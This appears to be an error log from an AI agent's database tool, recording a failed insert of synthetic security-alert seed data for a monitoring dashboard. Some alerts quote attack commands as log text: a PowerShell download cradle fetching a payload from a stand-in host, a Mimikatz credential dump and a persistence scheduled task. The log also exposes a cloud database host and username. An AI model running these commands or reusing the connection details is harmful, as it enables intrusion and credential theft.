# .manus/db/db-query-error-1771944137995.json
{
  "query": "\nINSERT INTO graph_security_events (endpointId, alertId, ruleId, ruleLevel, ruleDescription, mitreTactic, mitreTechnique, mitreId, agentId, agentName, srcIp, dstIp, eventTimestamp, rawData, syncedAt) VALUES\n-- Brute force on web-server\n(2, 'alert-001', '5710', 12, 'sshd: Attempt to login using a non-existent user', 'Credential Access', 'Brute Force', 'T1110', '002', 'web-server-01', '10.0.0.55', '192.168.50.100', NOW() - INTERVAL 2 HOUR, '{\"full_log\":\"sshd[12345]: Failed password for invalid user admin from 10.0.0.55 port 48230\"}', NOW()),\n(2, 'alert-002', '5712', 10, 'sshd: brute force trying to get access to the system', 'Credential Access', 'Brute Force', 'T1110.001', '002', 'web-server-01', '10.0.0.55', '192.168.50.100', NOW() - INTERVAL 1 HOUR, '{\"full_log\":\"sshd: 15 failed login attempts in 60 seconds from 10.0.0.55\"}', NOW()),\n(2, 'alert-003', '31104', 7, 'Nginx: Multiple web server 400 error codes', 'Initial Access', 'Exploit Public-Facing Application', 'T1190', '002', 'web-server-01', '10.0.0.88', '192.168.50.100', NOW() - INTERVAL 3 HOUR, '{\"full_log\":\"nginx: 400 Bad Request from 10.0.0.88 - path traversal attempt\"}', NOW()),\n-- Lateral movement on DC\n(4, 'alert-004', '60106', 14, 'Windows: Logon with explicit credentials (pass-the-hash)', 'Lateral Movement', 'Use Alternate Authentication Material', 'T1550.002', '004', 'win-dc-01', '192.168.50.200', '192.168.50.50', NOW() - INTERVAL 30 MINUTE, '{\"full_log\":\"EventID 4624: Logon Type 9 from 192.168.50.200 using NTLM\"}', NOW()),\n(4, 'alert-005', '60103', 12, 'Windows: User account created', 'Persistence', 'Create Account', 'T1136.001', '004', 'win-dc-01', NULL, NULL, NOW() - INTERVAL 45 MINUTE, '{\"full_log\":\"EventID 4720: User account svc_backdoor was created by admin\"}', NOW()),\n(4, 'alert-006', '60009', 10, 'Windows: PowerShell script block logging - suspicious', 'Execution', 'Command and Scripting Interpreter', 'T1059.001', '004', 'win-dc-01', NULL, NULL, NOW() - INTERVAL 20 MINUTE, '{\"full_log\":\"PowerShell ScriptBlock: Invoke-Mimikatz -DumpCreds\"}', NOW()),\n(4, 'alert-007', '60116', 15, 'Windows: Possible DCSync attack detected', 'Credential Access', 'OS Credential Dumping', 'T1003.006', '004', 'win-dc-01', '192.168.50.200', '192.168.50.50', NOW() - INTERVAL 15 MINUTE, '{\"full_log\":\"EventID 4662: DS-Replication-Get-Changes-All from non-DC host 192.168.50.200\"}', NOW()),\n-- DB server events\n(3, 'alert-008', '87900', 8, 'MySQL: Multiple authentication failures', 'Credential Access', 'Brute Force', 'T1110', '003', 'db-server-01', '192.168.50.200', '192.168.50.101', NOW() - INTERVAL 4 HOUR, '{\"full_log\":\"mysqld: Access denied for user root@192.168.50.200 (using password: YES)\"}', NOW()),\n(3, 'alert-009', '5502', 5, 'sshd: authentication success after multiple failures', 'Initial Access', 'Valid Accounts', 'T1078', '003', 'db-server-01', '192.168.50.200', '192.168.50.101', NOW() - INTERVAL 3 HOUR, '{\"full_log\":\"sshd[54321]: Accepted password for dba_admin from 192.168.50.200\"}', NOW()),\n-- K8s events\n(5, 'alert-010', '100100', 10, 'Kubernetes: Privileged container started', 'Privilege Escalation', 'Escape to Host', 'T1611', '005', 'k8s-node-01', NULL, NULL, NOW() - INTERVAL 6 HOUR, '{\"full_log\":\"containerd: container started with --privileged flag, image: alpine:latest\"}', NOW()),\n(5, 'alert-011', '100102', 12, 'Kubernetes: Container exec into running pod', 'Execution', 'Container Administration Command', 'T1609', '005', 'k8s-node-01', '192.168.50.200', '192.168.50.120', NOW() - INTERVAL 5 HOUR, '{\"full_log\":\"kubectl exec -it suspicious-pod -- /bin/bash from 192.168.50.200\"}', NOW()),\n-- Mail server events\n(6, 'alert-012', '3801', 6, 'Postfix: Relay denied', 'Initial Access', 'Phishing', 'T1566', '006', 'mail-server', '10.0.0.99', '192.168.50.60', NOW() - INTERVAL 8 HOUR, '{\"full_log\":\"postfix/smtpd: NOQUEUE: reject: RCPT from unknown[10.0.0.99]: 554 Relay access denied\"}', NOW()),\n(6, 'alert-013', '3802', 8, 'Postfix: Multiple relay attempts from single source', 'Collection', 'Email Collection', 'T1114', '006', 'mail-server', '10.0.0.99', '192.168.50.60', NOW() - INTERVAL 7 HOUR, '{\"full_log\":\"postfix: 50 relay attempts from 10.0.0.99 in 5 minutes\"}', NOW()),\n-- VPN gateway events\n(7, 'alert-014', '81600', 9, 'OpenVPN: Client connected from unusual location', 'Initial Access', 'External Remote Services', 'T1133', '007', 'vpn-gateway', '203.0.113.42', '192.168.50.1', NOW() - INTERVAL 1 HOUR, '{\"full_log\":\"openvpn: client j.smith connected from 203.0.113.42 (unusual geolocation: CN)\"}', NOW()),\n(7, 'alert-015', '81601', 7, 'OpenVPN: Multiple failed authentication attempts', 'Credential Access', 'Brute Force', 'T1110', '007', 'vpn-gateway', '198.51.100.77', '192.168.50.1', NOW() - INTERVAL 2 HOUR, '{\"full_log\":\"openvpn: AUTH_FAILED for user unknown from 198.51.100.77\"}', NOW()),\n-- Dev workstation events (compromised)\n(8, 'alert-016', '92100', 13, 'Suspicious PowerShell download cradle detected', 'Execution', 'Command and Scripting Interpreter', 'T1059.001', '008', 'dev-workstation', NULL, '203.0.113.100', NOW() - INTERVAL 10 HOUR, '{\"full_log\":\"powershell.exe: IEX(New-Object Net.WebClient).DownloadString(http://203.0.113.100/payload.ps1)\"}', NOW()),\n(8, 'alert-017', '92101', 14, 'Possible data exfiltration via DNS tunneling', 'Exfiltration', 'Exfiltration Over Alternative Protocol', 'T1048.001', '008', 'dev-workstation', '192.168.50.200', '203.0.113.100', NOW() - INTERVAL 9 HOUR, '{\"full_log\":\"dns: Anomalous DNS query volume to 203.0.113.100 - 500 queries in 60 seconds, avg subdomain length 45 chars\"}', NOW()),\n(8, 'alert-018', '92102', 11, 'Windows: New scheduled task created', 'Persistence', 'Scheduled Task/Job', 'T1053.005', '008', 'dev-workstation', NULL, NULL, NOW() - INTERVAL 8 HOUR, '{\"full_log\":\"schtasks.exe /create /tn UpdateCheck /tr C:\\\\Users\\\\developer\\\\AppData\\\\Local\\\\Temp\\\\svc.exe /sc MINUTE /mo 5\"}', NOW()),\n-- Wazuh manager self-monitoring\n(1, 'alert-019', '550', 5, 'Integrity checksum changed', 'Defense Evasion', 'Indicator Removal', 'T1070', '001', 'wazuh-manager', NULL, NULL, NOW() - INTERVAL 12 HOUR, '{\"full_log\":\"ossec: File /etc/hosts modified. MD5 changed.\"}', NOW()),\n(1, 'alert-020', '5501', 3, 'Login session opened', 'Initial Access', 'Valid Accounts', 'T1078', '001', 'wazuh-manager', '192.168.50.10', '192.168.50.213', NOW() - INTERVAL 6 HOUR, '{\"full_log\":\"sshd[9999]: Accepted publickey for admin from 192.168.50.10\"}', NOW());\n",
  "command": "mysql --batch --raw --column-names --default-character-set=utf8mb4 --host gateway02.us-east-1.prod.aws.tidbcloud.com --port 4000 --user 3xenzgJ3NGNThF2.96bc46f6ec2f --database 9n2ukZGVgWAjZMdS2ZS3BU --execute \nINSERT INTO graph_security_events (endpointId, alertId, ruleId, ruleLevel, ruleDescription, mitreTactic, mitreTechnique, mitreId, agentId, agentName, srcIp, dstIp, eventTimestamp, rawData, syncedAt) VALUES\n-- Brute force on web-server\n(2, 'alert-001', '5710', 12, 'sshd: Attempt to login using a non-existent user', 'Credential Access', 'Brute Force', 'T1110', '002', 'web-server-01', '10.0.0.55', '192.168.50.100', NOW() - INTERVAL 2 HOUR, '{\"full_log\":\"sshd[12345]: Failed password for invalid user admin from 10.0.0.55 port 48230\"}', NOW()),\n(2, 'alert-002', '5712', 10, 'sshd: brute force trying to get access to the system', 'Credential Access', 'Brute Force', 'T1110.001', '002', 'web-server-01', '10.0.0.55', '192.168.50.100', NOW() - INTERVAL 1 HOUR, '{\"full_log\":\"sshd: 15 failed login attempts in 60 seconds from 10.0.0.55\"}', NOW()),\n(2, 'alert-003', '31104', 7, 'Nginx: Multiple web server 400 error codes', 'Initial Access', 'Exploit Public-Facing Application', 'T1190', '002', 'web-server-01', '10.0.0.88', '192.168.50.100', NOW() - INTERVAL 3 HOUR, '{\"full_log\":\"nginx: 400 Bad Request from 10.0.0.88 - path traversal attempt\"}', NOW()),\n-- Lateral movement on DC\n(4, 'alert-004', '60106', 14, 'Windows: Logon with explicit credentials (pass-the-hash)', 'Lateral Movement', 'Use Alternate Authentication Material', 'T1550.002', '004', 'win-dc-01', '192.168.50.200', '192.168.50.50', NOW() - INTERVAL 30 MINUTE, '{\"full_log\":\"EventID 4624: Logon Type 9 from 192.168.50.200 using NTLM\"}', NOW()),\n(4, 'alert-005', '60103', 12, 'Windows: User account created', 'Persistence', 'Create Account', 'T1136.001', '004', 'win-dc-01', NULL, NULL, NOW() - INTERVAL 45 MINUTE, '{\"full_log\":\"EventID 4720: User account svc_backdoor was created by admin\"}', NOW()),\n(4, 'alert-006', '60009', 10, 'Windows: PowerShell script block logging - suspicious', 'Execution', 'Command and Scripting Interpreter', 'T1059.001', '004', 'win-dc-01', NULL, NULL, NOW() - INTERVAL 20 MINUTE, '{\"full_log\":\"PowerShell ScriptBlock: Invoke-Mimikatz -DumpCreds\"}', NOW()),\n(4, 'alert-007', '60116', 15, 'Windows: Possible DCSync attack detected', 'Credential Access', 'OS Credential Dumping', 'T1003.006', '004', 'win-dc-01', '192.168.50.200', '192.168.50.50', NOW() - INTERVAL 15 MINUTE, '{\"full_log\":\"EventID 4662: DS-Replication-Get-Changes-All from non-DC host 192.168.50.200\"}', NOW()),\n-- DB server events\n(3, 'alert-008', '87900', 8, 'MySQL: Multiple authentication failures', 'Credential Access', 'Brute Force', 'T1110', '003', 'db-server-01', '192.168.50.200', '192.168.50.101', NOW() - INTERVAL 4 HOUR, '{\"full_log\":\"mysqld: Access denied for user root@192.168.50.200 (using password: YES)\"}', NOW()),\n(3, 'alert-009', '5502', 5, 'sshd: authentication success after multiple failures', 'Initial Access', 'Valid Accounts', 'T1078', '003', 'db-server-01', '192.168.50.200', '192.168.50.101', NOW() - INTERVAL 3 HOUR, '{\"full_log\":\"sshd[54321]: Accepted password for dba_admin from 192.168.50.200\"}', NOW()),\n-- K8s events\n(5, 'alert-010', '100100', 10, 'Kubernetes: Privileged container started', 'Privilege Escalation', 'Escape to Host', 'T1611', '005', 'k8s-node-01', NULL, NULL, NOW() - INTERVAL 6 HOUR, '{\"full_log\":\"containerd: container started with --privileged flag, image: alpine:latest\"}', NOW()),\n(5, 'alert-011', '100102', 12, 'Kubernetes: Container exec into running pod', 'Execution', 'Container Administration Command', 'T1609', '005', 'k8s-node-01', '192.168.50.200', '192.168.50.120', NOW() - INTERVAL 5 HOUR, '{\"full_log\":\"kubectl exec -it suspicious-pod -- /bin/bash from 192.168.50.200\"}', NOW()),\n-- Mail server events\n(6, 'alert-012', '3801', 6, 'Postfix: Relay denied', 'Initial Access', 'Phishing', 'T1566', '006', 'mail-server', '10.0.0.99', '192.168.50.60', NOW() - INTERVAL 8 HOUR, '{\"full_log\":\"postfix/smtpd: NOQUEUE: reject: RCPT from unknown[10.0.0.99]: 554 Relay access denied\"}', NOW()),\n(6, 'alert-013', '3802', 8, 'Postfix: Multiple relay attempts from single source', 'Collection', 'Email Collection', 'T1114', '006', 'mail-server', '10.0.0.99', '192.168.50.60', NOW() - INTERVAL 7 HOUR, '{\"full_log\":\"postfix: 50 relay attempts from 10.0.0.99 in 5 minutes\"}', NOW()),\n-- VPN gateway events\n(7, 'alert-014', '81600', 9, 'OpenVPN: Client connected from unusual location', 'Initial Access', 'External Remote Services', 'T1133', '007', 'vpn-gateway', '203.0.113.42', '192.168.50.1', NOW() - INTERVAL 1 HOUR, '{\"full_log\":\"openvpn: client j.smith connected from 203.0.113.42 (unusual geolocation: CN)\"}', NOW()),\n(7, 'alert-015', '81601', 7, 'OpenVPN: Multiple failed authentication attempts', 'Credential Access', 'Brute Force', 'T1110', '007', 'vpn-gateway', '198.51.100.77', '192.168.50.1', NOW() - INTERVAL 2 HOUR, '{\"full_log\":\"openvpn: AUTH_FAILED for user unknown from 198.51.100.77\"}', NOW()),\n-- Dev workstation events (compromised)\n(8, 'alert-016', '92100', 13, 'Suspicious PowerShell download cradle detected', 'Execution', 'Command and Scripting Interpreter', 'T1059.001', '008', 'dev-workstation', NULL, '203.0.113.100', NOW() - INTERVAL 10 HOUR, '{\"full_log\":\"powershell.exe: IEX(New-Object Net.WebClient).DownloadString(http://203.0.113.100/payload.ps1)\"}', NOW()),\n(8, 'alert-017', '92101', 14, 'Possible data exfiltration via DNS tunneling', 'Exfiltration', 'Exfiltration Over Alternative Protocol', 'T1048.001', '008', 'dev-workstation', '192.168.50.200', '203.0.113.100', NOW() - INTERVAL 9 HOUR, '{\"full_log\":\"dns: Anomalous DNS query volume to 203.0.113.100 - 500 queries in 60 seconds, avg subdomain length 45 chars\"}', NOW()),\n(8, 'alert-018', '92102', 11, 'Windows: New scheduled task created', 'Persistence', 'Scheduled Task/Job', 'T1053.005', '008', 'dev-workstation', NULL, NULL, NOW() - INTERVAL 8 HOUR, '{\"full_log\":\"schtasks.exe /create /tn UpdateCheck /tr C:\\\\Users\\\\developer\\\\AppData\\\\Local\\\\Temp\\\\svc.exe /sc MINUTE /mo 5\"}', NOW()),\n-- Wazuh manager self-monitoring\n(1, 'alert-019', '550', 5, 'Integrity checksum changed', 'Defense Evasion', 'Indicator Removal', 'T1070', '001', 'wazuh-manager', NULL, NULL, NOW() - INTERVAL 12 HOUR, '{\"full_log\":\"ossec: File /etc/hosts modified. MD5 changed.\"}', NOW()),\n(1, 'alert-020', '5501', 3, 'Login session opened', 'Initial Access', 'Valid Accounts', 'T1078', '001', 'wazuh-manager', '192.168.50.10', '192.168.50.213', NOW() - INTERVAL 6 HOUR, '{\"full_log\":\"sshd[9999]: Accepted publickey for admin from 192.168.50.10\"}', NOW());\n",
  "returncode": 1,
  "logs": [
    "ERROR 3140 (22032) at line 2: Invalid JSON text: ?"
  ]
}